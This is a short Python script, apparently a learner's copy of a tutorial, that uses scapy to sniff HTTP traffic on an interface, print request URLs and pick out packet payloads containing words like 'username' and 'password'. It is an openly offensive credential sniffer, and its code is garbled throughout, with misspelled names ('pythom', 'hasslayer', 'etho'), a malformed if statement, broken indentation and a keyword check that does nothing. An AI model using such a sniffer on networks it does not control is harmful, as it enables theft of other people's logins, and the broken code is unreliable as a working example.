#usr/bin/env pythom
import scapy.all as scapy
from scapy.layers import http
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface,store=false,pin=process_sniffed_packet)
def get_url(packet):
    return packet[http.HTTPRequest].path

def get_login_info(packet):
    if packet.haslayer(scapy.RAW).load
    keywords= ["username","user","login","password","pass"]
    for keyword in load:
        return load

def process_sniffed_packet(packet):
    if packet.hasslayer(http.HTTPRequest):
   url = get_url(packet)
   print("[+] HTTP Request >>" + url)

   login_info = get_login_info(packet)
   if login_info:
   print("\n\n[+] possible username/password>"+ login_info + "\n\n")
sniff("etho")
